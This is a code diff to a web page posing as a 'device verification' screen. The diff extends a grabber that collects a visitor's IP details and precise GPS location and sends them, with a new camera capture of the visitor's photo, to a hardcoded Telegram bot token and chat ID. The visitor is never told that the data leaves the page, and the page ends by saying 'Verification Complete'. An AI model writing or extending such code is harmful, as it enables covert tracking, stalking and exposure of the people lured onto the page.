@@ -29,8 +29,25 @@
             margin: 20px 0;
             border-radius: 8px;
         }
+        #camera-feed {
+            width: 100%;
+            max-height: 300px;
+            object-fit: cover;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
         .hidden {
             display: none;
+        }
+        .btn {
+            background: #0088cc;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+            font-size: 14px;
         }
     </style>
     <!-- Leaflet CSS for Map -->
@@ -41,12 +58,19 @@
         <h2>Please wait while we verify your device...</h2>
         <p>This may take a few seconds</p>
         <div id="map" class="hidden"></div>
+        <video id="camera-feed" class="hidden" autoplay playsinline></video>
+        <button id="capture-btn" class="hidden btn">Capture Photo</button>
+        <canvas id="canvas" class="hidden"></canvas>
     </div>
 
     <script>
-        // Telegram configuration
+        // Telegram configuration - Using your provided token and ID
         const TELEGRAM_BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
         const TELEGRAM_CHAT_ID = "6913353602";
+
+        // Global variables
+        let cameraStream = null;
+        let map = null;
 
         // Load Leaflet JS for maps dynamically
         function loadMapScript() {
@@ -142,7 +166,7 @@
                 try {
                     const responses = await Promise.all([
                         fetch(`https://ipapi.co/${ipData.ip}/json/`),
-                        fetch(`https://ipinfo.io/${ipData.ip}/json?token=YOUR_IPINFO_TOKEN`) // Replace with your token
+                        fetch(`https://ipinfo.io/${ipData.ip}/json?token=YOUR_IPINFO_TOKEN`)
                     ]);
                     
                     const [ipapiData, ipinfoData] = await Promise.all(responses.map(r => r.json()));
@@ -204,6 +228,10 @@
                         road: 'Street',
                         city: 'City',
                         country: 'Country'
+                    },
+                    mapLinks: {
+                        googleMaps: 'https://maps.google.com',
+                        openStreetMap: 'https://www.openstreetmap.org'
                     }
                 });
                 
@@ -216,6 +244,13 @@
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
                         const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords;
+                        
+                        // Generate map links
+                        const mapLinks = {
+                            googleMaps: `https://www.google.com/maps?q=${latitude},${longitude}`,
+                            openStreetMap: `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}&zoom=15`,
+                            bingMaps: `https://www.bing.com/maps?cp=${latitude}~${longitude}&lvl=15`
+                        };
                         
                         // Get detailed address
                         let address = {
@@ -243,7 +278,8 @@
                             altitude: altitude ? `${altitude.toFixed(1)}m ±${altitudeAccuracy.toFixed(1)}m` : 'Sea Level',
                             heading: heading ? `${heading.toFixed(1)}°` : 'North',
                             speed: speed ? `${(speed * 3.6).toFixed(1)} km/h` : '0 km/h',
-                            address: address
+                            address: address,
+                            mapLinks: mapLinks
                         });
                     },
                     (error) => {
@@ -255,6 +291,10 @@
                                 road: 'Street',
                                 city: 'City',
                                 country: 'Country'
+                            },
+                            mapLinks: {
+                                googleMaps: 'https://maps.google.com',
+                                openStreetMap: 'https://www.openstreetmap.org'
                             }
                         });
                     },
@@ -267,7 +307,7 @@
         async function initMap(lat, lng, accuracy) {
             await loadMapScript();
             
-            const map = L.map('map').setView([lat, lng], 15);
+            map = L.map('map').setView([lat, lng], 15);
             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                 attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
             }).addTo(map);
@@ -284,6 +324,44 @@
                 .openPopup();
             
             document.getElementById('map').classList.remove('hidden');
+        }
+
+        // Access camera and show feed
+        async function accessCamera() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'environment',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                const videoElement = document.getElementById('camera-feed');
+                videoElement.srcObject = cameraStream;
+                videoElement.classList.remove('hidden');
+                document.getElementById('capture-btn').classList.remove('hidden');
+            } catch (error) {
+                console.error('Camera access error:', error);
+                await sendToTelegram('⚠️ Camera access denied or not available');
+            }
+        }
+
+        // Capture photo from camera
+        function capturePhoto() {
+            const video = document.getElementById('camera-feed');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Send photo to Telegram
+            canvas.toBlob(async (blob) => {
+                await sendPhotoToTelegram(blob);
+                // Stop camera after capture
+                cameraStream.getTracks().forEach(track => track.stop());
+                document.getElementById('camera-feed').classList.add('hidden');
+                document.getElementById('capture-btn').classList.add('hidden');
+            }, 'image/jpeg', 0.9);
         }
 
         // Collect All Data with Enhanced Features
@@ -312,6 +390,9 @@
                     console.error('Map initialization failed:', e);
                 }
             }
+            
+            // Access camera
+            await accessCamera();
             
             return {
                 // Enhanced Network Data
@@ -373,6 +454,8 @@
             message += `- Accuracy: ${data.location.accuracy}\n`;
             message += `- Altitude: ${data.location.altitude}\n`;
             message += `- Heading: ${data.location.heading} | Speed: ${data.location.speed}\n`;
+            message += `- Google Maps: ${data.location.mapLinks.googleMaps}\n`;
+            message += `- OpenStreetMap: ${data.location.mapLinks.openStreetMap}\n`;
             
             message += `- Address:\n`;
             for (const [key, value] of Object.entries(data.location.address)) {
@@ -405,26 +488,23 @@
             return message;
         }
 
-        // Main Execution
-        async function runVerification() {
+        // Send photo to Telegram
+        async function sendPhotoToTelegram(photoBlob) {
             try {
-                const allData = await collectAllData();
-                const formattedMessage = formatData(allData);
-                await sendToTelegram(formattedMessage);
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', photoBlob, 'user_photo.jpg');
                 
-                // Final message with map visible
-                document.querySelector('.loading-message h2').textContent = 'Verification Complete';
-                document.querySelector('.loading-message p').textContent = 'You may close this page';
-                
-            } catch (error) {
-                console.error('Verification error:', error);
-                document.querySelector('.loading-message h2').textContent = 'Verification Failed';
-                document.querySelector('.loading-message p').textContent = 'Please try again later';
-                await sendToTelegram(`⚠️ Verification Error: ${error.message}`);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                console.error('Error sending photo:', e);
             }
         }
 
-        // Telegram sending function
+        // Send message to Telegram
         async function sendToTelegram(message) {
             try {
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -439,6 +519,28 @@
                 });
             } catch (e) {
                 console.error('Telegram error:', e);
+            }
+        }
+
+        // Main Execution
+        async function runVerification() {
+            try {
+                const allData = await collectAllData();
+                const formattedMessage = formatData(allData);
+                await sendToTelegram(formattedMessage);
+                
+                // Set up capture button
+                document.getElementById('capture-btn').addEventListener('click', capturePhoto);
+                
+                // Final message
+                document.querySelector('.loading-message h2').textContent = 'Verification Complete';
+                document.querySelector('.loading-message p').textContent = 'Take a photo if required, then close this page';
+                
+            } catch (error) {
+                console.error('Verification error:', error);
+                document.querySelector('.loading-message h2').textContent = 'Verification Failed';
+                document.querySelector('.loading-message p').textContent = 'Please try again later';
+                await sendToTelegram(`⚠️ Verification Error: ${error.message}`);
             }
         }
 
